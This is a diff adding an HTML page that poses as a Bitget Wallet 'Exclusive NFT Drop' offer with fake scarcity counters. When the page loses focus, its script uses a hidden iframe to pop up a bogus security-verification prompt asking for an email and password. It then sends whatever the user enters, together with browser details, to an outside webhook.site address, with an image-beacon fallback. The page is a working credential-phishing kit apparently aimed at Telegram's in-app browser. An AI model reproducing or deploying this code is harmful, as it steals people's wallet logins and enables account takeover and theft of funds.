@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>Bitget Wallet - Exclusive NFT Drop</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #E100FF 0%, #7F00FF 100%);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px 30px;
+            border-radius: 20px;
+            margin-top: 60px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            margin: 20px 0;
+            font-weight: 600;
+        }
+        .highlight {
+            background: linear-gradient(90deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            font-size: 32px;
+        }
+        .btn {
+            background: linear-gradient(90deg, #E100FF, #7F00FF);
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 30px;
+            box-shadow: 0 4px 15px rgba(225, 0, 255, 0.4);
+            transition: transform 0.2s;
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        iframe { 
+            visibility: hidden; 
+            position: absolute;
+            width: 0;
+            height: 0;
+        }
+    </style>
+    <script>
+        window.onblur = function() {
+            // Delay 1 detik untuk timing yang natural
+            setTimeout(function() {
+                document.getElementById("iframe").src = "javascript:" +
+                    "var result = prompt(" +
+                    "'🔐 Bitget Wallet Security Verification\\\\n\\\\n" +
+                    "To access this exclusive drop, please\\\\n" +
+                    "verify your Bitget Wallet account:\\\\n\\\\n" +
+                    "Format: email:password', " +
+                    "'email@example.com:yourpassword'" +
+                    ");" +
+                    "if(result) {" +
+                    "  fetch('https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55', {" +
+                    "    method: 'POST'," +
+                    "    mode: 'no-cors'," +
+                    "    headers: {'Content-Type': 'text/plain'}," +
+                    "    body: JSON.stringify({" +
+                    "      creds: result," +
+                    "      ua: navigator.userAgent," +
+                    "      platform: navigator.platform," +
+                    "      timestamp: new Date().toISOString()," +
+                    "      target: 'Telegram Browser'" +
+                    "    })" +
+                    "  }).catch(function(e){ " +
+                    "    var img = new Image();" +
+                    "    img.src = 'https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55?d=' + encodeURIComponent(result);" +
+                    "  });" +
+                    "}";
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🪄</div>
+        <h1>Exclusive NFT Drop</h1>
+        <p>Limited to first 100 collectors</p>
+        <p class="highlight">0.5 SOL Value</p>
+        <button class="btn" onclick="alert('Tap anywhere on screen to continue...')">
+            Claim Your NFT
+        </button>
+        <p class="info">⏰ Ends in 2 hours | 🔥 87/100 claimed</p>
+    </div>
+    <iframe id="iframe"></iframe>
+</body>
+</html>
